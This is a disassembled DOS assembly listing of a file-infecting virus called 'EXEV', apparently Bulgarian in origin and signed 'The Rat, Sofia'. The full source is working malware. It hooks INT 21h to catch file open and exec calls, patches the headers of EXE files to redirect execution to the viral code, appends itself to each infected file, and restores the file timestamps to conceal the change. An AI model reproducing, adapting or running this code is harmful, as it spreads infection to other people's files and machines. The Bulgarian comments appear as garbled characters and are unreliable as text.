
PAGE  59,132

;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                             EXEV                                     ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ      Created:   2-Jun-90                                             ÛÛ
;ÛÛ      Version:                                                        ÛÛ
;ÛÛ      Passes:    9          Analysis Options on: ABCDEFPX             ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛ                                                                      ÛÛ
;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ

data_13e        equ     1000h                   ; (6B7E:1000=0)

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a


                org     100h

exev            proc    far

start:
                mov     dx,offset data_1        ; (6B7E:010A=0Ah)
                mov     ah,9
                int     21h                     ; DOS Services  ah=function 09h
                                                ;  display char string at ds:dx
                jmp     loc_2                   ; (0A10)
data_1          db      0Ah, 0Dh, '‚ ¸¨¿² ¿§®¢¨° ¥ § °¨¡¥­. '
                db      'Œ  © ±¬¥«® ! ..', 0Ah, 0Dh, '$'
                db      0
                db      1928 dup (0)
data_3          dw      0
                db      0, 0, 0, 0
data_4          dw      0
data_5          dw      0
data_6          dw      0
                db      0, 0, 0, 0
data_7          dw      0
                db      0, 0, 0, 0
data_8          dw      0
data_9          dw      0
                db      310 dup (0)
loc_2:
                cld                             ; Clear direction
                mov     ax,352Bh
                int     21h                     ; DOS Services  ah=function 35h
                                                ;  get intrpt vector al in es:bx
                mov     bp,ds
                push    cs
                pop     ds
                add     word ptr jmp_far+3,bp   ; °¨¡ ¢¿ ªº¬ JMP FAR ²¥ª³¹¨¿ ±¥£¬¥­²
                mov     si,0A10h                ; °¥¬¥±²¢  £® ¢ ±¥£¬¥­²  ª®©²® ±®·¨
                mov     di,si                   ; ES ²®¢  ¥ ±¥£¬¥­²  ­  INT 21H
                mov     cx,180h
                rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
                push    es                      ; ‘«¥¤ ª ²® £® ¯°¥¬¥±²¨ ±¥ ®¡°º¹  ªº¬
                mov     ax,offset prehod        ; ­¥£®,­® ­  ­®¢¨¿  ¤°¥±
                push    ax
                retf                            ; Return far
prehod          label   word
                lea     di,[bx+1Bh]             ; ‡ °¥¦¤  ±¥£¬¥­²  ­  ¢°º¹ ­¥ ¢ JMP FAR
                mov     al,0E9h                 ; ‡ ¯¨±¢  ª®¤  ­  JMP
                stosb                           ; Store al to es:[di]
                mov     ax,offset jmp_far+3     ; ’®¢  ¥  ¤°¥±  ­  ª®©²® ²°¿¡¢  ¤  ±¥
                sub     ax,di                   ; ®¡°º¹ ,¨§¢ ¦¤  £® ®² ®²¬¥±²¢ ­¥²® ­ 
                stosw                           ; INT 21H ¨ £® § ¯¨±¢ 
                stosw                           ; ’®¢  § ¯¨±¢  ¢ ®±² ­ «¨²¥ ¡ ©²®¢¥
                stosw                           ; ¯° §­¨ ¨­±²°³ª¶¨¨
                mov     cs:data_3,di            ; ’®¢  ¥  ¤°¥±  ­  INT 21H
                mov     ax,ss                   ; ‚º§±² ­®¢¿¢  SS
                sub     ax,18h
                cli
                mov     ss,ax
                lea     ax,[bp+10h]             ; ‚§¥¬   ¤°¥±  ®² ª®©²® ²°¿¡¢ 
                mov     bx,11h                  ; ¤  ±¥ § °¥¤¨ ¯°®£° ¬ ² 
move            label   word
loc_3:
                mov     es,ax
                add     ax,18h
                mov     ds,ax
                xor     si,si                   ; °¥¬¥±²¢  ¡«®ª®¢¥ ¯® 180h ¡ ©²  § 
                xor     di,di                   ; ¤  £¨ ¢º°­¥ ­  ¬¿±²®²® ¨¬.° ¢¨ £®
                mov     cx,0C0h                 ; 11h ¯º²¨ §  ¤  ±¥ ¨§° ¢­¨
                rep     movsw                   ; Rep when cx >0 Mov [si] to es:[di]
                dec     bx
                jns     loc_3                   ; Jump if not sign
                sti                             ; Enable interrupts
                mov     ds,bp                   ; ‚º§±² ­®¢¿¢  DS ¨ ES
                push    ds
                pop     es
jmp_far:        db      0EAh,0,0,0,0            ; ’®¢  ¥  ¤°¥±  ­  §  ¢°º¹ ­¥ ¨ JMP FAR
int_21:         cld                             ; Ž’ ’“Š ‡€Ž—‚€ Ž€Ž’Š€’€ € INT 21H
                cmp     ah,3Dh                  ; '='
                je      loc_4                   ; Jump if equal
                cmp     ah,4Bh                  ; 'K'
                jne     loc_5                   ; Jump if not equal
loc_4:                                          ;  xref 6B7E:0A70
                push    es
                call    sub_5                   ; (0AAD)
                pop     es
loc_5:                                          ;  xref 6B7E:0A75
                jmp     cs:data_3               ; JMP ªº¬ INT 21h

exev            endp

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_1           proc    near                    ; —¥²¥/§ ¯¨±¢  ¯°¥´¨ª±  ­  ´ ©« 
                mov     cx,20h                  ;  §¯®« £  £® ®² INT 21H_SEG:8C2
                mov     dx,8C2h
                jmp     short loc_6             ; (0A90)                         ; (0A90)

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_2:
                mov     ax,4200h
                xor     dx,dx                   ; Zero register

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_3:
                xor     cx,cx

;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß

sub_4:                                          ; Ž¡°º¹  ±¥ ªº¬ INT 21H
loc_6:                                          ;  xref 6B7E:0A87
                pushf                           ; Push flags
                push    cs
                call    cs:data_3               ; (6B7E:08C0=0)
                retn
sub_1           endp

abort  :        mov     al,3                    ; ‚µ®¤­  ²®·ª  ­  INT 24H
                iret                            ; Interrupt return
_1              dw      17D0h
                dw      1509h
                dw      154Ch
_2              dw      0F7Ah
                dw      15DCh                   ;’³ª ¥ ¨  ¤°¥±  ­  INT 13H
                dw      161Fh

_3              dw      0FC9h,15DCh,161Fh        ;’®¢  ±  ¤ ­­¨²¥ § 
                                                 ;INT 25H,INT 26H,INT 27H

;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;                              SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ

sub_5           proc    near
                push    di                      ; ‡ ¯ §¢  °¥£¨±²°¨²¥
                push    si
                push    dx
                push    cx
                push    bx
                push    ax
                push    ds
                xor     ax,ax                   ; Zero register
                mov     ds,ax
                push    cs
                pop     es
                mov     si,4Ch
                push    si
                mov     di,8E2h
                mov     cx,28h                  ; ‡ ¯ §¢  ¯°ªº±¢ ­¨¿²  ®² 13H ¤® 24H
                rep     movsw                   ; Rep when cx >0 Mov [si] to es:[di]
                pop     di
                push    ds
                pop     es
                mov     al,70h                  ; 'p'
                mov     ds,ax
                mov     al,ds:data_13e          ;®±² ¢¿ ¢ al ±º¤º°¦ ­¨¥²® ­  70:1000
                mov     si,offset _1
                cmp     al,0
                je      loc_7                   ; Jump if equal
                mov     si,offset _2
                cmp     al,0Fh
                je      loc_7                   ; Jump if equal
                mov     si,offset _3
loc_7:                                          ;  xref 6B7E:0AD5, 0ADC
                push    cs
                pop     ds
                movsw
                mov     al,70h                  ; ‘¬¥­¿ INT 13H
                stosw                           ; Store ax to es:[di]
                mov     di,90h
                mov     ax,offset abort         ; ‘¬¥­¿  ¤°¥±  ­  INT 24H
                stosw                           ; Store ax to es:[di]
                mov     ax,cs
                stosw
                movsw
                stosw                           ; ‚°º¹  ®°¨£¨­ «­¨²¥ ¢µ®¤­¨
                movsw                           ; ²®·ª¨ ­  INT 25H , INT 26H ,
                stosw                           ; INT 27H
                pop     ds
                mov     ax,3D02h                ; Ž²¢ °¿ ´ ©«  §  ·¥²¥­¥/§ ¯¨±
                call    sub_4                   ; (0A90)
                push    ds
                push    cs
                pop     ds
                mov     bx,ax
                mov     ax,5700h                ; ‚§¥¬  ¤ ² ²  ¨ · ±  ­  ´ ©« 
                jc      loc_9                   ; Jump if carry Set
                call    sub_4                   ; (0A90)
                push    cx                      ; ‡ ¯ §¢  ¤ ² ²  ¨ · ±  ¢ ±²¥ª 
                push    dx
                mov     ah,3Fh                  ; ”³­ª¶¨¿ §  ·¥²¥­¥ ­  ¯°¥´¨ª± 
                call    sub_1                   ; (0A81)
                cmp     data_5,0                ; °®¢¥°¿¢  §  ¯°¥¬¥±²¢ ¥¬¨ ±¨¬¢®«¨
                jne     loc_8                   ; ‡ ²¢ °¿ ¨ ¨§«¨§ 
                cmp     data_6,ax               ; °®¢¥°¿¢  ° §¬¥°  ­  ¯°¥´¨ª±  0 ?
                jne     loc_8                   ; Jump if not equal
                mov     ax,data_4               ; ®±² ¢¿ ¢ AX ¤º«¦¨­ ²  ­  ´ ©« 
                shl     ax,1                    ; “¬­®¦ ¢  ¿ ¯® 2
                mov     word ptr move-2,ax      ; ‡ ¯¨±¢  ª®«ª® ¯º²¨ ¤  ±¥ ¯°¥¬¥±²¨
                sub     data_6,18h              ;  ¬ «¿¢  ¤º«¦¨­ ²  ­  ¯°¥´¨ª± 
                add     data_7,18h              ; “¢¥«¨· ¢  ®²¬¥±²¢ ­¥²® ­  SS ± 18h
                mov     ax,0A10h
                xchg    ax,data_8               ; IP ¤  ¡º¤¥ ­  ®²¬¥±²¢ ­¥ A10h
                mov     word ptr jmp_far+1,ax   ; ‡ ¯ §¢  IP ¢ FAR JMP
                mov     ax,0FF5Fh               ; ®±² ¢¿ CS ² ª ,·¥ CS:IP ¤ 
                xchg    ax,data_9               ; ±®·¨ ­ · «®²® ­  ¢¨°³± 
                add     ax,10h
                mov     word ptr jmp_far+3,ax   ; ®±² ¢¿ ¢ JMP FAR ±¥£¬¥­² 
                call    sub_2                   ; ®±² ¢¿ ¢ ­ · «®²® ­  ´ ©« 
                mov     ah,40h                  ; ‡ ¯¨±¢  ¯°¥´¨ª± 
                call    sub_1                   ; (0A81)
                mov     ax,4200h
                mov     dx,80h                  ;°¥¬¥±²¢  ¯®ª § «¥¶  ­  80h
                call    sub_3                   ; (0A8E)
                mov     cx,180h
                mov     dx,0A10h
                mov     ah,40h                  ; ‡ ¯¨±¢  ¢¨°³± 
                call    sub_4                   ; (0A90)
loc_8:                                          ;  xref 6B7E:0B15, 0B1B
                pop     dx
                pop     cx
                mov     ax,5701h                ; ‡ ¯¨±¢  ±² °¨¿ · ± ¨ ¤ ² 
                call    sub_4                   ; (0A90)
                mov     ah,3Eh                  ; ‡ ²¢ °¿ ´ ©« 
                call    sub_4                   ; (0A90)
loc_9:                                          ;  xref 6B7E:0B04
                mov     si,8E2h
                mov     di,4Ch
                mov     cx,28h                  ; ‚°º¹  ¯°¥ªº±¢ ­¨¿² 
                rep     movsw                   ; Rep when cx >0 Mov [si] to es:[di]
                pop     ds
                pop     ax                      ; ‚º§±² ­®¢¿¢  °¥£¨±²°¨²¥
                pop     bx
                pop     cx
                pop     dx
                pop     si
                pop     di
                retn
sub_5           endp

                db      'The Rat, Sofia'



seg_a           ends

                end  start
